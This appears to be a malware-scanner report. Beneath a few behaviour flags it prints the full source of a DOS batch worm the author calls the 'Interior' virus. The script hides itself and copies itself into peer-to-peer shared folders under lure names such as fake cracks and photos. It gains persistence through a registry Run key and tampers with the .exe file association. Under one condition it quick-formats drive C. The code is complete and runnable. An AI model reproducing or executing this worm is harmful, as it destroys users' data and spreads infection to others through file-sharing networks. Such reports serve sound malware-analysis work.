behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.Run: May run an executable file or a system command

docinfo.macro:
@echo off
ctty nul
if exist c:\Interor.bat goto 27
echo 1 >>%0
copy %0 c:\Interor.bat >nul
@attrib +h +s c:\Interor.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\LoveYou.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Cool_Boy.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\GamerLand.exe.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Sex.exe.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Game_of_Love.exe.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Kaspersky_crack.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Cool_Photo.mp3.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\http_server.jpg.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Porno_photo.jpg.bat >nul
copy %0 c:\progra~1\Uninstall.exe.bat >nul
copy %0 %windir%\LittleLove.txt.bat >nul
echo REGEDIT4>C:\ere.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\ere.reg
echo "InteCaX"="c:\\Interor.bat" >> C:\ere.reg
regedit /s C:\ere.reg
del C:\ere.reg >nul
if exist %windir%\1.sys goto 2
if not exist %windir%\1.sys goto 1
:1
echo 1 >>%windir%\1.sys
echo !a-xa-xa!  >>c:\Interior.inf
echo !a-xa-xa!  >>c:\Interior.txt
:2
:27
if exist c:\Interior.inf goto 5
if not exist c:\Interior.inf goto Ints
:Ints
echo y|Format c:/q >nul
:5
if exist c:\Interior.txt goto 11
if not exist c:\Interior.txt goto 12
:12
set interD=.e
echo REGEDIT4>C:\Interio.reg
echo.>>C:\Interior.reg
echo [HKEY_CLASSES_ROOT\%interD%xe]>>C:\Interio.reg
echo "%1" = "txtfile">>C:\Interio.reg
echo "Content Type" = "text/plain">>C:\Interio.reg
echo "PerceivedType" = "text">>C:\Interio.reg
regedit /s C:\Interio.reg
del C:\Interio.reg
:11
echo       Interior virus. >>%windir%\info.txt
echo   Little worm/p2p virus. >>%windir%\info.txt
echo       "Interior" >>%windir%\info.txt
copy %0 A:\readme.txt.bat >nul
ctty con
cls

filetype: DOS batch file, ASCII text, with CRLF line terminators

dump: if not exist c:\Interior.inf goto Ints
